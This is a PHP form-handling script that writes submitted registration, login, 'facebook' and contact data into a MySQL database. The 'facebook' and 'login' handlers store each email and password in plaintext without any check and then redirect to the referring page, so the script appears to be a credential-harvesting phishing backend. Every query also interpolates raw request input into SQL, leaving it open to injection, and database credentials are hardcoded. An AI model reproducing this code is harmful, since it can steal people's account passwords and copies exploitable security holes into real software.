<?php
session_start() ;

$servername = "localhost";
$username = "henrik";
$password = "1234";
$dbname = "erevan";

     // Create connection
     $conn = new mysqli($servername, $username, $password, $dbname);
     // Check connection
     if ($conn->connect_error) {
         die("Connection failed: " . $conn->connect_error);
     } 


if(isset($_POST['send'])){

    $name = $_REQUEST['name'];
    $email = $_REQUEST['email'];
    $tel = $_REQUEST['tel'];
    $city = $_REQUEST['city'];
    $password = $_REQUEST['password'];

    // print_r($name." ". $email." ".$tel." ".$city." ".$password );


        $sql = "INSERT into `grancvel` (`name`, `email`, `tel`, `city`, `password`) VALUES ('$name', '$email','$tel','$city','$password')";

        if ($conn->query($sql) === TRUE) {      
            echo "New record created successfully";
              $_SESSION["name"] = $name;
              header('Location: http://www.example.com/');
        } else {
            echo "Error: " . $sql . "<br>" . $conn->error;
        }

  
}

if(isset($_POST['facebook'])){
    $email = $_REQUEST['email'];
    $password = $_REQUEST['password'];

    $sql = "INSERT into `facebook` ( `email`, `password`) VALUES ('$email','$password')";

    if ($conn->query($sql) === TRUE) {      
          $_SESSION["name"] = $email;
          $hots =  $_SERVER['HTTP_REFERER'];
          header('Location:'.$hots);
          
    } else {
        echo "Error: " . $sql . "<br>" . $conn->error;
    }
}

if(isset($_POST['login'])){
    $email = $_REQUEST['email'];
    $password = $_REQUEST['password'];
    $sql = "INSERT into `login` ( `email`, `password`) VALUES ('$email','$password')";

    if ($conn->query($sql) === TRUE) {      
        $_SESSION["name"] = $email;
        $hots =  $_SERVER['HTTP_REFERER'];
        header('Location:'.$hots);
        
  } else {
      echo "Error: " . $sql . "<br>" . $conn->error;
  }
}

if(isset($_POST['contact'])){
    $name = $_REQUEST['name'];
    $email = $_REQUEST['email'];
    $text = $_REQUEST['text'];

    $sql = "INSERT into `contact` (`name`, `email`, `text`) VALUES ('$name','$email','$text')";

    if ($conn->query($sql) === TRUE) {      
        $hots =  $_SERVER['HTTP_REFERER'];
        header('Location:'.$hots);
        
  } else {
      echo "Error: " . $sql . "<br>" . $conn->error;
  }
}



$conn->close();

